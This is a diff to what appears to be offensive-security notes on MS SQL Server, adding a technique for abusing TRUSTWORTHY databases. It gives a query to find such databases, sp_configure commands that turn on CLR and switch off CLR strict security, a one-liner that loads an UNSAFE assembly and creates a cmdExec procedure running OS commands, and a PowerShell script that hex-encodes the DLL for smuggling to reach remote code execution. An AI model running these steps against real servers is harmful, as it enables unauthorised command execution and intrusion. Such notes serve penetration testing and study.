@@ -52,3 +52,53 @@ EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGU
 
 **If a database has the TRUSTWORTHY property set, it's possible to use the CREATE ASSEMBLY statement to import a managed DLL as an object inside the SQL server and execute methods within it**
 
+Query to find trust_worthy databases
+```sql
+SELECT name AS DatabaseName, suser_name(owner_sid) AS OwnerName, is_trustworthy_on AS IsTrustworthyOn FROM sys.databases WHERE HAS_DBACCESS(name) = 1 AND is_trustworthy_on = 1 ORDER BY name;
+```
+
+Creating a stored procedure from an assembly is not allowed by default. This is controlled through the CLR Integration setting, which is disabled by default. Luckily, we can enable it using sp_configure and the clr enabled option.
+
+Beginning with Microsoft SQL Server 2017, there is an additional security mitigation called CLR strict security. This mitigation only allows signed assemblies by default. CLR strict security can also be disabled through sp_configure with the clr strict security option.
+
+In summary, we must execute the SQL statements shown below before we start creating the stored procedure from an assembly.
+
+
+``` sql
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+
+EXEC sp_configure 'clr enabled',1
+RECONFIGURE
+
+EXEC sp_configure 'clr strict security', 0
+RECONFIGURE
+```
+
+
+```sql
+EXEC sp_configure 'show advanced options',1
+; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0
+; RECONFIGURE; CREATE ASSEMBLY myAssembly FROM 'c:\tools\StoredProcedure.dll' WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec]; EXEC cmdExec 'whoami'
+```
+<br>
+
+Powershell script to make a managed DLL into a hex string
+
+```powershell
+$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
+$stringBuilder = New-Object -Type System.Text.StringBuilder 
+
+$fileStream = [IO.File]::OpenRead($assemblyFile)
+while (($byte = $fileStream.ReadByte()) -gt -1) {
+    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
+}
+$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
+```
+
+
+### Pass the hex encoded DLL file in the create assembly query to smuggle exe and achieve RCE.
+
+
+
+
